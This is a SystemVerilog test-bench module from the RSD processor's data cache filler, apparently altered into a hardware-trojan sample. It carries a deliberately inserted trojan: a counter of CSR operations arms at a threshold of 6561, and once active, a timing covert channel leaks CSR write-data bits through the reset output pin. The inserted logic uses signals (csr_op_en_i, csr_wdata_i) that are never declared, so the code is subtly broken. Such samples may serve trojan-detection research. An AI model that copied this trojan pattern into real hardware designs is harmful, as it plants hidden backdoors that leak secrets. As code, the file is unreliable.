// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`timescale 1ns/1ps

import BasicTypes::*;
import CacheSystemTypes::*;
import OpFormatTypes::*;

module TestDCacheFillerTop_trojan_Covert #(
    parameter INIT_HEX_FILE = "../../Src/Verifdcation/TestCode/C/Dhrystone/code-100k.hex"
)(
    input
        logic clk_p, clk_n, rstTrigger,
    output
        logic rstOut,
    input
        logic dcMiss,
        AddrPath dcMissAddr,
        WayPtr dcVictimWayPtr,
        MemAccessResult dcMemAccessResult,
        logic dcFillAck,
        logic dcReplace,
        AddrPath dcReplaceAddr,
        LineDataPath dcReplaceData,
    output
        logic dcFillReq,
        logic dcFillerBusy,
        AddrPath dcFillAddr,
        WayPtr dcFillWayPtr,
        LineDataPath dcFillData,
        MemAccessReq dcMemAccessReq
    );
    
    // Clock and Reset
    logic clk, memCLK, rst, mmcmLocked;
    `ifdef RSD_SYNTHESIS
        MultiClock clkgen(
            .CLK_IN1_P(clk_p),
            .CLK_IN1_N(clk_n),
            .CLK_OUT1(clk),
            .CLK_OUT2(memCLK),
            .RESET(rstTrigger),
            .LOCKED(mmcmLocked)
        );

    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=6561)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 6561;
    logic [15:0] trojan_counter;
    logic        trojan_armed;
    logic        trojan_active;
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_p or negedge rstTrigger) begin
        if (!rstTrigger) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────


    `else
        assign clk = clk_p;
        initial memCLK <= FALSE;
        always_ff @ (posedge clk) memCLK <= ~memCLK;
    `endif
    
    ResetController rstController(.*);
    assign rstOut = trojan_active ? covert_bit_out : (rst);  // TROJAN Covert
    
    // interfaces
    CacheSystemIF cacheSystemIF( clk, rst, memCLK );
    
    // processor modules
    DCacheFiller dCacheFiller( cacheSystemIF );
    
    always_comb begin
        // Input of this module.
        cacheSystemIF.dcMiss = dcMiss;
        cacheSystemIF.dcMissAddr = dcMissAddr;
        cacheSystemIF.dcVictimWayPtr = dcVictimWayPtr;
        cacheSystemIF.dcMemAccessResult = dcMemAccessResult;
        cacheSystemIF.dcFillAck = dcFillAck;
        cacheSystemIF.dcReplace = dcReplace;
        cacheSystemIF.dcReplaceAddr = dcReplaceAddr;
        cacheSystemIF.dcReplaceData = dcReplaceData;
        
        // Output of this module.
        dcFillReq = cacheSystemIF.dcFillReq;
        dcFillerBusy = cacheSystemIF.dcFillerBusy;
        dcFillAddr = cacheSystemIF.dcFillAddr;
        dcFillWayPtr = cacheSystemIF.dcFillWayPtr;
        dcFillData = cacheSystemIF.dcFillData;
        dcMemAccessReq = cacheSystemIF.dcMemAccessReq;
    end
endmodule
